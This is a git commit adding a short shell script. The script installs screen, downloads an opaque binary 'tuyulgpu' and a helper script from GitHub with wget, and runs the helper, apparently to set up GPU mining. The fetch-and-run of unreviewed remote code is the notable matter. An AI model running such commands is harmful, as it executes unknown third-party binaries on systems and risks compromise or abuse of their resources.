48d85b6c8fbcf4567f171e6b3b27fc74ec3297fb
muterminer <86037273+muterminer@users.noreply.github.com>
2021-06-20 22:32:26 +0700

    Create gaskushib.sh

---
+++ gaskushib.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+
+sudo apt update
+sudo apt install screen -y
+screen -dmS gpukushib.sh ./gpukushib.sh 65 75
+wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
+wget https://raw.githubusercontent.com/muterminer/mutmin/main/gpukushib.sh
+chmod +x gpukushib.sh
+./gpukushib.sh
